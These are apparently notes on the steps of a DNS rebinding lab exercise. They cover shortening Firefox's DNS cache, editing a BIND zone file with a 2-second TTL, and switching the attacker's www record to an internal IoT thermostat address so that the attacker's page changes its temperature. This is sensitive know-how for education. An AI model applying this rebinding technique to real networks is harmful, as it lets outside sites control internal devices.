# DNS Rebinding Steps

## Reduce DNS Cache (Firefox)
- Open Firefox > `about:config` > network.dnsCacheExpiration = 10

## Config DNS (Local DNS)
- Access http://www.seediot32.com/ (Termómetro)
- `sudo nano /etc/resolvconf/resolv.conf.d/head`
- `sudo resolvconf -u `
- Access http://www.attacker32.com/ (Countdown)
- Close countdown

## Attacker DNS 
- `docker exec -it attacker-ns-10.9.0.153 bash`
- `nano /etc/bind/zone_attacker32.com`

```
# cat etc/bind/zone_attacker32.com
$TTL 2
@       IN      SOA   ns.attacker32.com. admin.attacker32.com. (
                2008111001
                8H
                2H
                4W
                1D)

@       IN      NS    ns.attacker32.com.

@       IN      A     10.9.0.180
;www     IN      A     10.9.0.180
www     IN      A     192.168.60.80
ns      IN      A     10.9.0.153
*       IN      A     10.9.0.100
```

- `rndc reload attacker32.com`

## Local DNS
`docker exec -it local-dns-server-10.9.0.53 /bin/sh -c 'rndc flush'`

## Test

- Access http://www.attacker32.com/change 

## Attack

- `docker exec -it attacker-ns-10.9.0.153 bash`
- `nano /etc/bind/zone_attacker32.com`

```
...
www     IN      A     10.9.0.180
;www      IN      A     192.168.60.80
...
```

- `rndc reload attacker32.com`

- Fix temperature http://www.seediot32.com/
- Reload http://www.attacker32.com/
- Show web console


- `nano /etc/bind/zone_attacker32.com`

```
...
;www     IN      A     10.9.0.180
www      IN      A     192.168.60.80
...
```

- `rndc reload attacker32.com`

- Show web console
- Check http://www.seediot32.com/